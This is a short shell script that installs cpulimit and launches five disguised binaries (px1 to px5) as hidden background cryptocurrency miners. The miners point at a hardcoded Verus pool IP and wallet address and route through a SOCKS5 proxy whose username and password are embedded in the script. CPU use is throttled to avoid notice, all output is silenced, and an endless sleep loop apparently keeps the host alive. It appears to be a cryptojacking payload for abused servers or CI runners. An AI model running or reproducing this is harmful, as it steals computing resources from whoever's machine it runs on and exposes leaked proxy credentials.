apt-get update -y
apt-get install -y cpulimit screen
apt-get install -y ca-certificates wget libcurl4
chmod +x px1
chmod +x px2
chmod +x px3
chmod +x px4
chmod +x px5
pool="stratum+tcp://79.137.70.48:3960"
workername="$(echo $(shuf -i 1-100 -n 1)-gg)"
thread="$(nproc --all)"
cpulimit -l 30 ./px1 -a verus -o $pool -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 ./px2 -a verus -o $pool -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 ./px3 -a verus -o $pool -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 ./px4 -a verus -o $pool -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
cpulimit -l 30 ./px5 -a verus -o $pool -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.$workername -p -t $thread -x socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080 >/dev/null 2>&1 >/dev/null &
while :; do echo "system true"; sleep 30m; done
